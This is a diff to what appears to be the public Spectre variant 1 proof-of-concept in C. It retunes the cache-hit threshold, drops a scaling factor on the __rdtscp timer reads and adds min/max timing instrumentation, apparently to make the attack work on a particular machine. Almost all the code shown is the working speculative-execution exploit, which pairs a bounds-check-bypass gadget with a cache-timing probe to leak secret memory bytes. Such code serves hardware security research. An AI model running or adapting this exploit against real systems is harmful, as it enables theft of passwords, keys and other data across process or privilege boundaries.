@@ -39,6 +39,7 @@ char * secret2= "This is some other sample sensitive data";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
+int vt1=0, vt2=0;
 void victim_function(size_t x) {
   if (x < array1_size) {
     temp &= array2[array1[x] * 512];
@@ -48,7 +49,7 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (0x4ff) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -87,9 +88,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
-      time1 = __rdtscp( & junk)*0x08; /* READ TIMER */
+      time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk)*0x08 - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      if (vt1==0 || vt1>time2) { vt1 = time2;}
+      if (vt2==0 || vt2<time2) { vt2 = time2;}
+      time2 |= 0x1ff;
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
@@ -139,5 +143,6 @@ int main(int argc,
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
+  printf("range of time %d - %d\n", vt1, vt2);
   return (0);
 }
